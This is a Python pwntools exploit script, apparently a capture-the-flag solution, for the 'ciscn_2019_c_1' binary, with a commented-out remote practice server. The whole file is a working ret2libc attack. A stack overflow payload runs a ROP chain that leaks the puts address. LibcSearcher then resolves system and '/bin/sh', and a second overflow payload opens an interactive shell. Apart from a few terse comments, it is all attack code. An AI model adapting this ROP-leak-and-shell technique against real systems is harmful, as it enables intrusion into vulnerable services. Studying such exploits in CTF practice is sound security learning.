import sys
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux','splitw','h']
p = process("./ciscn_2019_c_1")
#p = remote('node4.buuoj.cn',26755)
elf = ELF("./ciscn_2019_c_1")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = elf.symbols["main"]
pop_rdi = 0x400c83
ret = 0x4006b9 

payload1 = "\0"+"a"*87
payload1 += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
#this payload create the head and parameter in the puts-function 
p.recvuntil("Input your choice!")
p.send("1\n")
p.recv()
p.sendline(payload1)
#gdb.attach(p)
#pause()

p.recvuntil("Ciphertext\n")
p.recvuntil("\n")
#put_addr = u64(p.recv(8)) #this can not 
#put_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))
put_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print "puts addr:" + hex(put_addr)
libc = LibcSearcher('puts',put_addr)
libcbase = put_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
p.recv()
p.send("1\n")
payload2 = "\0"+"a"*87
payload2 += p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)
p.recv()
p.sendline(payload2)
p.interactive()

